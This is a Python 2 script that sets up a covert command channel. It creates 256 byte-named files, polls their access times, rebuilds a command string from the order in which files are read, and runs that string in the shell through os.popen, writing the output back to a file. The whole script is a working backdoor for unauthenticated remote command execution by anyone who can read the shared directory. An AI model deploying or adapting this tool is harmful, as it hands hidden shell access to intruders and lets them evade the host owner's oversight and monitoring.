#!/usr/bin/env python2
import os, sys, time

class ByteFile(object):
	def __init__(self, path, byte, accesstime):
		self.path = path
		self.byte = byte
		self.accesstime = accesstime

def touch(path):
	open(path, 'w').close()

def createByteFiles(hostDir):
	if( not os.path.exists(hostDir) ):
		os.makedirs(hostDir)

	byteFiles = []
	for i in xrange(0, 256):
		bf = ByteFile(hostDir + "/" + str(i) + ".txt", i, 0)
		touch(bf.path)
		byteFiles += [bf]

	return byteFiles

def executeCommand(cmd, outputfilepath):
	result = os.popen(cmd).read()
	out = open(outputfilepath, "w")
	out.write(result + "\n")
	out.close()

if __name__ == "__main__":
	if( len(sys.argv) != 2 ):
		print "USAGE: %s <hosting_directory>" % sys.argv[0]
		sys.exit(1)
	hostDir = sys.argv[1]

	print "Creating host files..."
	byteFiles = createByteFiles(hostDir)

	# In case the system has a networked filesystem or something
	# wait a minute for the files to be copied around before we
	# read the access time
	print "Waiting for files to propagate through filesystem..."
	time.sleep(3)

	for bf in byteFiles:
		bf.accesstime = os.path.getatime(bf.path)

	print "Ready for network access."
	buf = []
	while(True):
		time.sleep(0.1)

		# Poll access time for everyone
		for bf in byteFiles:
			newtime = os.path.getatime(bf.path)
			if( newtime != bf.accesstime ):
				byte = chr(bf.byte)
				print "Ready byte '%d'" % bf.byte
				bf.accesstime = newtime
				if( byte == '\n' ):
					cmd = "".join(buf)
					executeCommand(cmd, hostDir + "/output.txt")
					print "Executed command '%s'" % cmd
					buf = []
				else:
					buf += [byte]
